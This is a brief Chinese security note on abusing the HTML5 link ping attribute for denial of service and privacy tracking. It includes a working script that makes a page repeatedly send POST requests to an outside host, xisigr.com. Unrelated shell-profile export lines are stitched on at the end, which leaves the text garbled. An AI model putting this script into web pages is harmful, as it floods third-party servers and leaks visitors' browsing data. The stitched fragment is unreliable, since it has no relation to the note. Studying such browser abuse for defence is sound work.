-----

* 特性：ping属性
* 环境：发送异步请求，完成一次HTTP重定向，循环发送POST请求，造成DOS攻击；<br>
        PING-FROM、USER-AGENT、REFERER泄漏用户的隐私。
* 漏洞类型：DOS攻击、隐私追踪

-----   

举例：
-----
      <script> 
      var link = document.createElement('a'); 
      link.href=""; 
      link.ping = 'http://www.xisigr.com/'; 
      document.head.appendChild(link); link.click(); 
      </script>       
      运行上面的代码，就会不停的向xisigr.com发送POST请求。
      
 1 export CLICOLOR=1
  2 export LSCOLORS=gxfxcxdxbxegedabagacad
  3 export GREP_OPTIONS='--color=auto'
  4 export PS1='\[\e[01;33m\][\[\e[01;32m\]\u\[\e[01;33m\]@\[\e[01;35m\]\h:\[\e[    01;33m\]] \[\e[01;36m\]\w \[\e[01;32m\]\$ '
  5 export CFLAGS=-Qunused-arguments
  6 export CPPFLAGS=-Qunused-arguments
